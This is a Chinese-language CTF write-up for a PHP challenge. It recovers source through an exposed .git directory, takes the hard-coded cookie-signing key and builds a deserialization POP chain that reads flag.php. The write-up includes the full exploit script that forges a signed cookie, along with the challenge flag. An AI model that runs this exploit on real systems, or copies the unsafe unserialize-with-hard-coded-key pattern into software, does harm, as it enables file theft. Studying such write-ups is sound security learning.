# Arknights

## 题目简述

站点遗留了可访问的 `.git` 目录，可以恢复 PHP 源码。应用把抽卡会话序列化后存入客户端 Cookie，并用源码中的固定密钥签名；取得密钥后即可伪造合法 Cookie，把攻击者控制的对象交给 `unserialize()`，再通过析构函数与字符串转换函数组成文件读取 POP 链。

## 解题过程

目录枚举能访问以下 Git 元数据：

```text
/.git/HEAD
/.git/index
/.git/config
/.git/objects/...
```

用 GitHack、git-dumper 一类工具恢复对象后，可以得到 `index.php`、`pool.php`、`simulator.php` 等源码。会话类的核心逻辑为：

```php
class Session
{
    private $sessionData;
    const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";

    public function save()
    {
        $serialized = serialize($this->sessionData);
        $sign = base64_encode(md5($serialized . self::SECRET_KEY));
        $value = base64_encode($serialized) . "." . $sign;
        setcookie("session", $value);
    }

    public function extract($session)
    {
        $parts = explode(".", $session);
        $data = base64_decode($parts[0]);
        $sign = base64_decode($parts[1]);
        if ($sign === md5($data . self::SECRET_KEY)) {
            $this->sessionData = unserialize($data);
        } else {
            die("Go away! You hacker!");
        }
    }
}
```

签名没有阻止反序列化，因为密钥与算法都随源码泄露。可用的 POP 链是：

```text
Eeeeeeevallllllll::__destruct()
    -> echo $this->msg
    -> CardsPool::__toString()
    -> file_get_contents($this->file)
```

构造对象并按服务端相同规则签名：

```php
<?php

class Eeeeeeevallllllll
{
    public $msg = "坏坏liki到此一游";

    public function __destruct()
    {
        echo $this->msg;
    }
}

class CardsPool
{
    private $file;

    public function __construct($file)
    {
        $this->file = $file;
    }

    public function __toString()
    {
        return file_get_contents($this->file);
    }
}

$wrapper = new Eeeeeeevallllllll();
$wrapper->msg = new CardsPool("./flag.php");

const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";
$serialized = serialize($wrapper);
$sign = base64_encode(md5($serialized . SECRET_KEY));
$cookie = base64_encode($serialized) . "." . $sign;
echo $cookie;
```

把输出替换为请求中的 `session` Cookie。服务端验签通过后执行 `unserialize()`；请求结束时析构对象，`echo` 把 `CardsPool` 转成字符串，最终读取并回显 `./flag.php`。源码注释中的 flag 为：

```text
hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}
```

## 方法总结

对客户端保存的序列化会话，仅有“签名”并不足够：密钥硬编码且可由源码泄露时，攻击者既能控制序列化数据，也能生成合法签名。审计 PHP 反序列化题应先找入口和完整性校验，再从 `__destruct`、`__toString` 等魔术方法逆向连接可控属性与危险函数；同时要验证私有属性由正确类的构造函数写入，确保序列化后的属性名与服务端一致。
